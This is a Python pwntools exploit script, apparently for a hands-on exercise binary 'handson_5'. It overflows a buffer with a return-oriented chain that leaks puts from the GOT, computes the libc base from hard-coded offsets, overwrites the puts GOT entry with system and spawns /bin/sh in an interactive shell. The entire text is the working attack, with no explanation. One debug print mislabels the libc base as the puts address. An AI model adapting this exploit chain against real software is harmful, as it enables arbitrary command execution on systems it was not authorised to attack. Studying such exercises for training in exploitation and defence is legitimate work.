from pwn import *

target = process("./handson_5")

# address
puts_plt = 0x08048310
puts_got = 0x0804a010
gets_plt = 0x08048300

pop1ret = 0x80482e9

libc_puts_off = 0x67360
libc_system_off = 0x3cd10

# payload 
payload = b"A" * 42
payload += p32(puts_plt)
payload += p32(pop1ret)
payload += p32(puts_got)

payload += p32(gets_plt)
payload += p32(pop1ret)
payload += p32(puts_got)

payload += p32(puts_plt)
payload += b"BBBB"
payload += p32(puts_got + 4) 

_ = target.readline()
target.sendline(payload)
_ = target.readline()

libc_puts_addr = u32(target.readline()[0:4])
print("libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off
libc_system_addr = libc_base_addr + libc_system_off

print("libc_puts_addr : 0x{:x}\n".format(libc_base_addr))

target.sendline(p32(libc_system_addr) + b"/bin/sh\x00")


target.interactive()
